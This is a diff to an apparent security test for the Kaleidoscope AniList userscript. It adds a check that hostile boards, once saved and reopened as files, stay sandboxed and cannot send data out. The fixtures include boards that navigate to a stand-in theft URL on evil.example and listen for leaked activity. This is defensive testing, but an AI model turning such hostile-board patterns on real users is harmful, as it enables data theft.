@@ -9,6 +9,7 @@ opens made-up hostile boards in desktop Kaleidoscope (or the copy given, to comp
   WebRTC, and navigating its own frame later on; and that listens for any message Kaleidoscope sends it
 - boards that navigate their own frame at once, before their first load event, to another site, to a
   data: page and to about:blank, each with a listener waiting for whatever Kaleidoscope sends next
+- the same boards saved with Kaleidoscope's Save button and opened as a file of their own
 It passes when nothing reaches evil.example, no board or page it turned into ever receives your
 recent activity (or any other data), and what a real board needs still works: AniList's API, AniList's
 cover images, and "Open on AniList" (opened by Kaleidoscope, AniList addresses only). The recent
@@ -59,10 +60,26 @@ DATA_SPY = 'data:text/html,' + SPY.replace('\n', ' ')
 BOARDS = {'everything': EVERYTHING, 'instant-away': instant('https://evil.example/steal'),
           'instant-data': instant(DATA_SPY), 'instant-blank': instant('about:blank')}
 
-def open_board(script, html):
+SAVE = """(async () => {
+  await new Promise(r => setTimeout(r, 800));
+  const make = URL.createObjectURL.bind(URL);
+  let blob = null; URL.createObjectURL = b => { blob = b; return 'blob:saved'; };
+  const btn = [...document.querySelectorAll('button')].find(b => /Save/.test(b.textContent));
+  if (!btn) return { error: 'no Save button' };
+  btn.click(); await new Promise(r => setTimeout(r, 300));
+  if (!blob) return { error: 'Save made no file' };
+  // open the saved file as a page of its own, as it would be from your downloads
+  const w = window.open(make(new Blob([await blob.text()], { type: 'text/html' })));
+  if (!w) return { error: 'could not open the saved file' };
+  await new Promise(r => setTimeout(r, 3000));
+  let sandboxed = null; try { sandboxed = !!w.document.querySelector('iframe[sandbox="allow-scripts"]'); } catch (e) { sandboxed = 'unknown: ' + e.message; }
+  return { saved: true, sandboxed, at: (() => { try { return w.location.href.slice(0, 60); } catch (e) { return 'elsewhere'; } })() };
+})()"""
+
+def open_board(script, html, js=None):
     store = {'kaleidoscope.boards': [{'id': 'hostile', 'html': html, 'type': 'ANIME', 'user': 'JigglyPug', 'ts': 1762220400000, 'label': 'Test'}]}
     seed = tempfile.NamedTemporaryFile('w', suffix='.json', delete=False); json.dump(store, seed); seed.close()
-    js = """(async () => { await new Promise(r => setTimeout(r, 3000));
+    js = js or """(async () => { await new Promise(r => setTimeout(r, 3000));
       const strip = document.querySelector('.krecent');
       return { opened: window.__opened || [], strip: strip ? strip.textContent : '' }; })()"""
     r = subprocess.run(['node', f'{HERE}/shot.js', script, 'https://anilist.co/home#kaleidoscope-board=hostile', '/dev/null', '--clock', CLOCK,
@@ -88,6 +105,14 @@ def run(script=f'{R}/desktop/kaleidoscope/kaleidoscope.user.js'):
             if not any(u.startswith('https://anilist.co/anime/2') for u in opened): bad.append('[everything] window.open() to AniList no longer opens')
             if any('"webrtc":"function"' in q for q in reqs): bad.append('[everything] WebRTC is still reachable inside the board')
             if 'Recent activity' not in got.get('strip', ''): bad.append('[everything] the recent activity strip no longer shows on the page around the board')
+    # the same boards, saved and opened as a file of their own
+    for name in ('everything', 'instant-away'):
+        try: reqs, got = open_board(script, BOARDS[name], SAVE)
+        except RuntimeError as e: bad.append(f'[saved {name}] could not run: {e}'); continue
+        if got.get('error'): bad.append(f'[saved {name}] {got["error"]}'); continue
+        bad += [f'[saved {name}] got out: {q}' for q in reqs if EVIL in q]
+        if got.get('sandboxed') is not True: bad.append(f'[saved {name}] the saved file runs the board on its own, not in a sandboxed frame ({got.get("sandboxed")}, now at {got.get("at")})')
+        if name == 'everything' and not any('anilist.co/anime/1' in q for q in reqs): bad.append('[saved everything] "Open on AniList" no longer opens from a saved board')
     return bad
 
 if __name__ == '__main__':
